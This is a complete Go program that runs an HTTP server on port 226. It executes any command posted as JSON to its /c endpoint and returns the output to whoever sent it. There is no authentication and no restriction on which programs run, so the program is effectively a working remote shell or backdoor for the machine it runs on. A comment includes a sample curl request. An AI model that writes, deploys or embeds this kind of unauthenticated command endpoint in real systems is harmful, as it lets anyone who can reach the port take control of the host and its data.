// REFERENCES
// https://blog.kowalczyk.info/article/wOYk/advanced-command-execution-in-go-with-osexec.html

package main

import (
	"strings"
	"os/exec"
    "encoding/json"
    "fmt"
    "net/http"
)

type Command struct {
    Command  string `json:"command"`
}

func main() {
	// Custom command
	// Use comma "," to separate arguments
	// URL: address:226/c
	// Example: curl -X POST localhost:226/c -d "{\"command\":\"ipconfig,/all\"}"
    http.HandleFunc("/c", func(w http.ResponseWriter, r *http.Request) {
        var c Command
        json.NewDecoder(r.Body).Decode(&c)

		// show on Server, the submitted command
		//fmt.Println(c.Command) //NOTE: only for development

		// split the command per comma
		args := strings.Split(c.Command, ",")
		progname := args[0]
		progargs := []string{}
		
		// in case there is no split
		if len(args) > 1 {
			progargs = args[1:]
		}

		// run the damn command
		cmd := exec.Command(progname, progargs...)
		out, err := cmd.CombinedOutput()
		if err != nil {
			// if error, show to Client
			fmt.Fprintf(w, "%s", err)
		}

		// show to Client
		fmt.Fprintf(w, "%s", string(out))
    })

    http.ListenAndServe(":226", nil)
}